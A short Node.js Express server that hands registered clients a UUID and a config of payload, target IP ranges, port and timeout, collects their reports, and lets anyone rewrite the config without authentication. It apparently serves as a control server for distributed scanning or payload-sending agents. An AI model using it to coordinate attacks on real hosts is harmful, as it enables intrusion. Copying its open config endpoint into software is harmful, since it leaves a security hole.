const express = require('express');
const { v4 } = require('uuid');

const app = express();
const config = {
  Enabled: false, Payload: "", IPs: [{Start:[127,0,0,1],End:[127,0,0,1]}], Port: 0, Timeout: 1000,
};
const reports = {};

app.use(express.json());
app.use(express.static('public/'));

app.get('/config', (_, res) => {
  res.json(config);
});

app.post('/config', (req, res) => {
  Object.assign(config, req.body);
  res.sendStatus(200);
});

app.get('/xhr', (_, res) => {
  res.json(reports);
});

app.post('/update/:uuid', (req, res) => {
  reports[req.params.uuid] = req.body;
  res.json(Object.assign({
    UUID: req.params.uuid,
  }, config));
});

app.post('/register', async (_, res) => {
  const newUUID = v4();
  res.json(Object.assign({
    UUID: newUUID,
  }, config));
});

app.listen(process.env.NODE_PORT || 80, () => {
  console.log('init: done');
});
